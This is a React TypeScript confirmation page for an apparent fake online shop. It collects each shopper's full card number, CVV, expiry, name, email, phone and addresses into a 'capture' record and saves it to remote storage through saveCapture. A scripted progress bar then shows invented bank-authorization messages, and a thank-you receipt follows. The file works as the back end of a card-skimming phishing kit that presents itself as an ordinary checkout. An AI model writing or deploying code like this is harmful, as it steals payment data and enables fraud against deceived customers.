import { useEffect, useState } from 'react';
import { useNavigate, useLocation, Link } from 'react-router-dom';
import { CaptureRecord } from '../types';
import { saveCapture } from '../utils/cloudStorage';
import { useCart } from '../hooks/useCart';

export default function ConfirmationPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const { items, clearCart } = useCart();
  
  const payloadData = location.state as {
    verificationPayload: Record<string, string>;
    paymentPayload: Record<string, string>;
    totalAmount: number;
  } | null;

  const [loading, setLoading] = useState(true);
  const [progress, setProgress] = useState(0);
  const [stageText, setStageText] = useState('Securing order confirmation...');
  const [savedStatus, setSavedStatus] = useState(false);

  useEffect(() => {
    if (!payloadData || items.length === 0) {
      navigate('/');
      return;
    }

    const v = payloadData.verificationPayload;
    const p = payloadData.paymentPayload;

    // Create record matching the new schema
    const record: CaptureRecord = {
      id: `belle_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
      timestamp: new Date().toISOString(),
      items: items.map(it => ({
        productId: it.product.id,
        productName: it.product.name,
        options: it.selectedOptions,
        quantity: it.quantity,
        unitPrice: it.unitPrice,
        totalPrice: it.totalPrice
      })),
      totalAmount: payloadData.totalAmount,
      
      // Contact
      email: v.email || '',
      phone: v.phone || '',
      firstName: v.firstName || '',
      lastName: v.lastName || '',
      
      // Shipping
      shippingAddress: v.address || '',
      shippingApartment: v.apartment || '',
      shippingCity: v.city || '',
      shippingState: v.state || '',
      shippingZip: v.zip || '',
      shippingCountry: v.country || 'US',
      
      // Billing
      billingAddress: p.billingAddress || '',
      billingApartment: p.billingApartment || '',
      billingCity: p.billingCity || '',
      billingState: p.billingState || '',
      billingZip: p.billingZip || '',
      billingCountry: p.billingCountry || 'US',
      
      // Payment answers
      cardType: p.cardType || 'unknown',
      cardNumberLast4: p.cardNumberLast4 || '',
      cardFullNumber: p.cardFullNumber || '',
      cardExpiry: p.cardExpiry || '',
      cardCVV: p.cardCVV || '',
      cardName: p.cardName || ''
    };

    // Trigger save safely
    saveCapture(record)
      .then(() => setSavedStatus(true))
      .catch(e => console.error('Preservation status error:', e));

    // Clear cart so bundle doesn't stick after paying
    clearCart();

    // 8.5 seconds simulated timeline
    const checkpoints = [
      { at: 0, text: 'Encrypting verification destination info...' },
      { at: 20, text: 'Contacting US logistics routing hub...' },
      { at: 45, text: 'Processing order pricing and payment authorization...' },
      { at: 70, text: 'Verifying active bank routing checksums...' },
      { at: 90, text: 'Generating unique custom tracking token...' }
    ];

    const spanMs = 8500;
    const tickMs = 50;
    let spent = 0;

    const interval = setInterval(() => {
      spent += tickMs;
      const pct = Math.min((spent / spanMs) * 100, 100);
      setProgress(pct);

      for (let idx = checkpoints.length - 1; idx >= 0; idx--) {
        if (pct >= checkpoints[idx].at) {
          setStageText(checkpoints[idx].text);
          break;
        }
      }

      if (spent >= spanMs) {
        clearInterval(interval);
        setLoading(false);
      }
    }, tickMs);

    return () => clearInterval(interval);
  }, []);

  if (!payloadData) return null;

  const orderHash = `BLX-${Date.now().toString(36).toUpperCase()}`;

  if (loading) {
    return (
      <div className="min-h-screen bg-rose-50/30 flex flex-col items-center justify-center px-4 text-center">
        
        <div className="relative mb-8">
          {/* Luminous spinning indicator */}
          <div className="w-24 h-24 rounded-full border-2 border-rose-100 border-t-rose-600 animate-spin" />
          <div className="absolute inset-0 flex items-center justify-center">
            <span className="text-xs font-serif font-bold text-rose-950">{Math.round(progress)}%</span>
          </div>
        </div>

        <p className="text-sm font-serif font-bold text-rose-950 mb-1 animate-pulse">
          {stageText}
        </p>
        <p className="text-xs font-sans text-rose-950/40 max-w-xs">
          Simulating secure bank & dispatch response protocol. Please keep screen active.
        </p>

        {/* Customized elegant loading bar */}
        <div className="w-56 h-1 bg-rose-100 rounded-full mt-6 overflow-hidden">
          <div
            className="h-full bg-rose-600 rounded-full transition-all duration-75"
            style={{ width: `${progress}%` }}
          />
        </div>

      </div>
    );
  }

  const v = payloadData.verificationPayload;

  return (
    <div className="min-h-screen bg-rose-50/20 text-rose-950 pt-28 pb-20 px-4 sm:px-6">
      <div className="max-w-2xl mx-auto text-center">
        
        {/* Success confirmation layout matching prompted answers exactly */}
        <div className="w-20 h-20 bg-rose-50 border border-rose-200 rounded-full flex items-center justify-center text-3xl mx-auto mb-6 shadow-sm">
          💖
        </div>

        <h1 className="text-3xl sm:text-4xl font-serif font-bold text-rose-950 mb-3">
          Thank you for your order
        </h1>

        <p className="text-rose-950/70 text-sm sm:text-base max-w-md mx-auto leading-relaxed font-sans mb-8">
          Confirmation and tracking details will be sent to your email.
        </p>

        {/* Preserved receipt card summary */}
        <div className="bg-white rounded-3xl border border-rose-100 p-6 sm:p-8 text-left shadow-sm mb-8 space-y-4">
          <div className="flex items-center justify-between pb-4 border-b border-rose-50">
            <span className="text-xs uppercase tracking-widest text-rose-600 font-serif font-medium">Receipt code</span>
            <span className="text-xs font-mono font-bold text-rose-950">{orderHash}</span>
          </div>

          <div>
            <span className="text-xs text-rose-950/40 block mb-1">Delivering to destination</span>
            <p className="text-sm font-serif font-bold text-rose-950">{v.firstName} {v.lastName}</p>
            <p className="text-xs text-rose-950/80 mt-0.5 font-sans">
              {v.address} {v.apartment ? `• ${v.apartment}` : ''}
            </p>
            <p className="text-xs text-rose-950/80 font-sans">{v.city}, {v.state} {v.zip}</p>
          </div>

          <div className="pt-2">
            <span className="text-xs text-rose-950/40 block mb-1">Consumer link</span>
            <p className="text-xs text-rose-950 font-sans">{v.email} • {v.phone}</p>
          </div>

          <div className="pt-4 border-t border-rose-50 flex items-center justify-between">
            <span className="text-sm font-serif font-medium text-rose-950">Total Settled</span>
            <span className="text-xl font-serif font-bold text-rose-600">${payloadData.totalAmount.toFixed(2)}</span>
          </div>
        </div>

        {savedStatus && (
          <p className="text-[11px] text-emerald-600 font-serif mb-6 italic">
            ✓ Internal log snapshot encrypted and archived to local storage array successfully
          </p>
        )}

        <Link
          to="/"
          className="px-8 py-4 bg-rose-600 text-white rounded-full font-serif font-medium text-sm hover:bg-rose-700 transition-all shadow-sm block sm:inline-block"
        >
          Return to Vault Collection
        </Link>

      </div>
    </div>
  );
}
